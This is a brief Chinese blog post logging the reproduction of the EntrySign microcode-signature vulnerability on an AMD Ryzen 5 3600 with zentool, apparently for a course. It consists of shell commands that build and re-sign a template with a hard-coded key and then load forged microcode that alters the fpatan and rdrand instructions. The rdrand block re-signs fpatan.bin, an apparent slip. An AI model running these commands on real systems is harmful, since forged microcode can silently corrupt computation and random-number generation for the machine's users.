
---
title: '在AMD R5-3600 (Matisse)上复现EntrySign记录'
date: 2025-10-14 23:00:00
tags:
    - Security
    - CPU

categories:
  - AMD
---



Code of create template
```zsh
 cd ~/Code/CS253/EntrySign/security-research-zentool/pocs/cpus/entrysign/zentool
 ZENTOOL_XXTEA_KEY=0x2b7e151628aed2a6abf7158809cf4f3c  make template.bin 
 ./zentool edit --hdr-revlow 0x8701051 template.bin
 ./zentool resign template.bin

```

Code of attack on fpatan
```zsh
./zentool -o fpatan.bin edit --match 0=@fpatan --seq 0=7 --insn q0i0="add rax, rax, 0x1337" template.bin
./zentool resign fpatan.bin
sudo ./zentool load --cpu=2 fpatan.bin 
```
![fpatan攻击结果](images/entrysign-fpatan-crash.png)


Code of attack on rdrand
```zsh
./zentool -o rdrand.bin edit --match 0=@rdrand --seq 0=0x100002 --insn q0i0="mov.qs rax,rax,4" template.bin
./zentool resign fpatan.bin
sudo ./zentool/zentool load --cpu=4 ./zentool/rdrand.bin ;sudo rdmsr -a 0x8b ; taskset -c 4 ./rdrand_test
```
![rdrand攻击结果](images/entrysign-rdrand-crash.png)
